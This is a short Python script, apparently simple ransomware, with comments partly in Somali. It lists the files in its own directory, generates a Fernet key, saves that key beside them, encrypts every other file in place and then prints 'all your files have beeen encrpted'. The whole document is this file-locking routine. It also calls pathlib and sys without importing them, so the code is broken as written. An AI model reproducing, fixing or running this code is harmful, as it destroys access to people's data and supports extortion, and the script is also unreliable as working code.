import os 
from cryptography.fernet import Fernet
files = []

exe_dir = pathlib.Path(sys.argv[0]).parent

for fiile in os.listdir(exe_dir):
	if fiile == "ransom.py" or fiile== "thekey.key"or fiile== "decrypt.py":
		continue
	if os.path.isfile(os.path.join(exe_dir, fiile)):
        	files.append(os.path.join(exe_dir, fiile))

print(files)
#our key
key = Fernet.generate_key()
#we saved the key to file 	
with open(os.path.join(exe_dir, "thekey.key"), "wb") as thekey:
    thekey.write(key)	
	
	
#first we open the files then loccking the files/encriptiying it	
for file in files:
#file an furayno wixi ku jiro ku save gray varible contents
	with open(file,"rb") as thefile:
		contents = thefile.read()
	#encrpt
	#the key we gonna use to lock it up is the key we created top 
	#and give the contents
	contents_encrypted = Fernet(key).encrypt(contents)
	#know we need to write that enrypted contents back to the file
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
#go through files
#open it 
#encrpt it
#then write it back to the file as encrpted file
		
print("all your files have beeen encrpted")
		
		
		
